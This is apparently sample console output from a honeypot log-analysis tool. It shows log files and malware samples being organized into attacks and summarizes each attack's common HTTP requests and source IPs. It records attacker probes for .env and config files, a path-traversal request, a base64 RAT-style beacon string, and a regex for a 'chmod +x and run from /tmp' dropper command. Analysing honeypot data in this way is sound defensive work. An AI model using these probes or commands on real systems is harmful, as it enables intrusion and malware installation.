Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-23.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-22.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-24.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/039a100a9ad6ad1ccaea5bc0c5ee9330db53e007fee36a3751eec7c7f940ab7c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/039a100a9ad6ad1ccaea5bc0c5ee9330db53e007fee36a3751eec7c7f940ab7c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/abb79b34f4b0b92da15a86c1fc7533dd17cfffca362e53ddae98cf978b10d1cd
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/abb79b34f4b0b92da15a86c1fc7533dd17cfffca362e53ddae98cf978b10d1cd
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/bfa3daae0db8579a2332dd22473aa9b7aa9b75a08a2e53b04b0768f2703274d2
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-22.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/bfa3daae0db8579a2332dd22473aa9b7aa9b75a08a2e53b04b0768f2703274d2
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/d6528bab8c5559c68312285c0c214744f0f33ba93a51942bcc6d9d2770476e26
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/d6528bab8c5559c68312285c0c214744f0f33ba93a51942bcc6d9d2770476e26
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8f622cb686dac3f447759408abbcdcdfe89bf5e9c56467d96c6435588db6664f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8f622cb686dac3f447759408abbcdcdfe89bf5e9c56467d96c6435588db6664f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/52d0c6f738ad1186407dc9c1ec588fcb65a4295473b660b355dbe96c24585bdb
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/52d0c6f738ad1186407dc9c1ec588fcb65a4295473b660b355dbe96c24585bdb
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5fe60489106356ad6c84be890291de2514f25219379e586474c51cd163161aff
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5fe60489106356ad6c84be890291de2514f25219379e586474c51cd163161aff
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ef326a197652e77cbe4b9b5bfa8f276d77d3dbd13b25b6b094589b9a504c151b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ef326a197652e77cbe4b9b5bfa8f276d77d3dbd13b25b6b094589b9a504c151b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5ce92942d34bc35cbe3fb8759b810481b11ff43b070b6e67c124d88a83c93176
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5ce92942d34bc35cbe3fb8759b810481b11ff43b070b6e67c124d88a83c93176
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a63b0fd571a077734a68f5955bf91986c5f39af23f1d4552e02662aa9bac0458
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a63b0fd571a077734a68f5955bf91986c5f39af23f1d4552e02662aa9bac0458
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/90798b61d7dce18429335cd149b9b271e71fe121b11dcefca34f19a3839fb37c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/90798b61d7dce18429335cd149b9b271e71fe121b11dcefca34f19a3839fb37c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/e63969f07eb117998329f37cb3543d83c76c1260d6122120ec7b7d256676b022
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/e63969f07eb117998329f37cb3543d83c76c1260d6122120ec7b7d256676b022
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8a57f997513e762dec5cd58a2de822cdf3d2c7ef6372da6c5be01311e96e8358
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8a57f997513e762dec5cd58a2de822cdf3d2c7ef6372da6c5be01311e96e8358
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ae62fd6ad97b9833d48963333839235f5fd7b66bd0b55665cadaf5888327eca8
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ae62fd6ad97b9833d48963333839235f5fd7b66bd0b55665cadaf5888327eca8
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2a709210900cd1a8c658030b19dd832bfb271dee8956cf93c43314b3dc8175e1
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2a709210900cd1a8c658030b19dd832bfb271dee8956cf93c43314b3dc8175e1
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/713ca6a961a02c78b95decc18a01c69606d112c77ffc9f8629eb03ac39e7a22b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/713ca6a961a02c78b95decc18a01c69606d112c77ffc9f8629eb03ac39e7a22b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/c090ae197a6cd91ba529374e99972b78cda533f4ee94a292446ca88498ed453a
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/c090ae197a6cd91ba529374e99972b78cda533f4ee94a292446ca88498ed453a
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/71bb33abdf1a20737d74965af744075c27e8b5db1c6887d903fd6e029d39313f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/71bb33abdf1a20737d74965af744075c27e8b5db1c6887d903fd6e029d39313f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/275776445b4225c06861b2f6f4e2ccf98e3f919583bddb9965d8cf3d4f6aa18f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/275776445b4225c06861b2f6f4e2ccf98e3f919583bddb9965d8cf3d4f6aa18f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/9972b39bdad6e973490f4988693e0d730a93a4c4968fb542bdd3b28b8393a8a4
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/9972b39bdad6e973490f4988693e0d730a93a4c4968fb542bdd3b28b8393a8a4
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2d4af503d71c8d5ebedb020adea78e35bc37c5456dd15611f5e98c90cbb3d095
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2d4af503d71c8d5ebedb020adea78e35bc37c5456dd15611f5e98c90cbb3d095
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/firewall/dshield.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/loaded_scripts.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dhcp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/loaded_scripts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dhcp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-30.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/notice.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/reporter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/reporter.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/x509.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/x509.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/software.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/software.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/conn.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/snmp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/snmp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/stats.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_services.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_services.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/stats.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/capture_loss.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/capture_loss.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssl.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/firewall/dshield.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssh.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/sip.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/sip.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/files.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/analyzer.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssl.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/radius.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/radius.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/notice.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/tunnel.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/analyzer.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/tunnel.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dpd.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dpd.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/weird.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dns.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/weird.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/kerberos.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/kerberos.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_hosts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_hosts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/files.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dns.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssh.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-29.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/conn.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-02.json
Done organizing attack directories
Finished organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Honeypot AI Finished Successfully!    
    """,
    


    "load_from_attacks_dir": """
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1176a7410>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1176a6f50>
Loading Attack: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117695950>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x117697a90>
Processed 596 eveLoading Attack: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117763cd0>
Processed 679 events (0 cowrie events, 679 zeek Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x117761e10>
Loading Attack: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1175982d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11759a890>nts). Found 1 source ips
Loading Attack: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117695fd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x117695a90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x128aa7190>
Loading Attack: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117668a50>
Loading Attack: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1288b3850>
Loaded Attack: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2
Loaded Attack: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13
Loaded Attack: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Loaded Attack: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01
Loaded Attack: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a
Loaded Attack: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf
Loaded Attack: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1288b1b10>ps
Loading Attack: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x128973e10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x128971bd0>
Loading Attack: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x128973d50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x128971a90>
tack: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804ound 3 source ips
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x128a4d490>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11766a9d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x128a4f3d0>
Loading Attack: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117875f50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1178752d0>
Loading Attack: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117874cd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x117874090>
Loading Attack: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x117529b90>
Loaded Attack: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518ss
Loaded Attack: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1s
Loaded Attack: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060s
Loaded Attack: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x117529bd0>
Loading Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199(2686 cowrie events, 1026 zeek events). Found 7 source ips
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1159751d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11565aa10>
Loading Attack: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x115cd7a90>
Loaded Attack: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804s 1 source ips
Loaded Attack: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf
Loaded Attack: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x116308510>vents, 1335 zeek events). Found 10 source ips
Loading Attack: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1160a4250>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1160a4410>
Loading Attack: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1160abc90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1160abdd0>
Loading Attack: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1160a8f50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1160a9210>
Loading Attack: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1160a5f10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1160a75d0>
Loading Attack: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1160a4c10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1160a6090>
Loaded Attack: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80s
Loaded Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Loaded Attack: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656
Loaded Attack: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d
Loaded Attack: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade
Loaded Attack: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac
Loaded Attack: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2
Loaded Attack: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88
(28->28) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 2268: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 <- 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1 by malware_urls
Merged 0 attacks by out of 2268 attempts (0.0000%) 
Merge Attacks Time: 0.2451s
(28->28) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(28->26) - Merged 2 attacks with shared sig regexes


Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1316, HTTP: 1306, Httplogs: 147 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
####################################################################################
#                            most_common3_http_requests                            #
####################################################################################
#                                                                                  #
# [('GET /docker/.env HTTP/1.1\n'                                                  #
#   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like ' #
#   'Gecko) Chrome/81.0.4044.129 Safari/537.36\n'                                  #
#   'Host: 54.67.87.80',                                                           #
#   12),                                                                           #
#  ('GET /.env HTTP/1.1\n'                                                         #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '    #
#   '(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n'                         #
#   'Host: 54.67.87.80',                                                           #
#   11),                                                                           #
#  ('POST /.env HTTP/1.1\n'                                                        #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '    #
#   '(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n'                         #
#   'Host: 54.67.87.80',                                                           #
#   11)]                                                                           #
#                                                                                  #
####################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '54.222.143.33'    #
#                    #
######################



Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 279, HTTP: 18, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
########################################################################################################################
#                                              most_common3_http_requests                                              #
########################################################################################################################
#                                                                                                                      #
# [("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win "                       #
#   '7 Professional SP1 '                                                                                              #
#   "x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhL #
# mV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA= "                                                          #
#   'HTTP/\n',                                                                                                         #
#   10),                                                                                                               #
#  ('GET / HTTP/1.0\n', 4),                                                                                            #
#  ('  HTTP/1.1\n', 4)]                                                                                                #
#                                                                                                                      #
########################################################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '66.240.205.34'    #
#                    #
######################



Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1836, HTTP: 1836, Httplogs: 520 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
###############################################################################
#                          most_common3_http_requests                         #
###############################################################################
#                                                                             #
# [('GET /server-status HTTP/1.1\n'                                           #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '            #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                      #
#   3),                                                                       #
#  ('GET /login.sh HTTP/1.1\n'                                                #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '            #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                      #
#   3),                                                                       #
#  ('GET /config.xml HTTP/1.1\n'                                              #
#   'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '            #
#   'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n' #
#   'Host: 54.67.87.80',                                                      #
#   3)]                                                                       #
#                                                                             #
###############################################################################
######################
# most_common_src_ip #
######################
#                    #
# '18.116.202.221'   #
#                    #
######################



Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 197, HTTP: 21, Httplogs: 2 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################
#           most_common3_http_requests          #
#################################################
#                                               #
# [('GET ../../proc/ HTT HTTP/0.9\n', 14),      #
#  ('GET / HTTP/1.1\nHost: 54.67.87.80:80', 7)] #
#                                               #
#################################################
######################
# most_common_src_ip #
######################
#                    #
# '68.69.186.30'     #
#                    #
######################



Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 98, HTTP: 63, Httplogs: 6 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
#################################################################################
#                           most_common3_http_requests                          #
#################################################################################
#                                                                               #
# [('GET / HTTP/1.1\n'                                                          #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
#   '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \n'                 #
#   'Host: 54.67.87.80',                                                        #
#   13),                                                                        #
#  ('HEAD /icons/sphere1.png HTTP/1.1\n'                                        #
#   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' #
